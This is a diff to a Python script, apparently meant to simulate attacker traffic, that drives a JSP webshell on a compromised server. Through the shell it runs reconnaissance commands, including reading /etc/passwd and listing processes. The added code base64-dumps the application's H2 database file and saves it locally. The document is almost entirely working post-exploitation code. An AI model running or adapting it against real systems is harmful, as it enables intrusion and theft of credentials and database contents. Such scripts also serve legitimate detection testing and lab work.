@@ -1,6 +1,7 @@
 import requests
 import sys
 import json
+from time import sleep
 
 def format_list(list):
     formatted = list.split('\n')
@@ -16,6 +17,7 @@ def perform_reconnaissance(url):
     db_placeholder = "spring.datasource.url="
     recon_data = {}
     recon_data.update({"os": execute_command(url, "uname -a")})
+    recon_data.update({"workdir": execute_command(url, "pwd")})
     recon_data.update({"user": execute_command(url, "id")})
     recon_data.update({"passwd": format_list(execute_command(url, "cat /etc/passwd"))})
     recon_data.update({"processes": execute_command(url, "ps aux")})
@@ -29,20 +31,43 @@ def perform_reconnaissance(url):
             recon_data.update({"db": property[len(db_placeholder):]})
     return recon_data
 
+def extract_db_file(url, recon_data):
+    workdir = recon_data.get("workdir").strip("/")
+    workdir = "/" + workdir.strip()
+    file_name = recon_data.get("db").strip()
+    file_name = file_name[file_name.index("/"):]+".mv.db"
+    file_location = workdir+file_name
+    file_contents = execute_command(url, "base64 " + file_location).strip("//")
+    with open ("db_dump.txt", "w") as f:
+        f.write(file_contents)
+
+    
+
 
 def main():
-    if len(sys.argv) != 2:
-        print("Program expects a url as an argument python3 simulate_attacker_traffic.py <url/to/jsp>")
+    if len(sys.argv) < 2 or len(sys.argv) > 3:
+        print("Program expects a url as an argument. \nUsage python3 simulate_attacker_traffic.py <url/to/jsp> <repeat_times (optional)>")
         sys.exit(1)
     webshell_url = sys.argv[1]
+    if len(sys.argv) == 3 and sys.argv[2].isdigit() and int(sys.argv[2]) > 1:
+        repeat = int(sys.argv[2])
+    else:
+        print(False)
+        repeat = 1
     r = requests.get(webshell_url, params={"cmd": "id"})
     if r.status_code != 200:
         print("Provided url seems invalid. Please try again...")
         sys.exit(1)
     else:
         print("Webshell located, performing attack")
-    print("[*] Performing reconnaissance")
-    print(json.dumps(perform_reconnaissance(webshell_url), indent=2))
+    for i in range(repeat):
+        print("[*] Performing reconnaissance")
+        recon_data = perform_reconnaissance(webshell_url)
+        if recon_data.get("db").index("file") != 0:
+            print("[*] Performing db file extraction")
+            extract_db_file(webshell_url, recon_data)
+        sleep(1)
+    print(json.dumps(recon_data, indent=2))
 
     
 
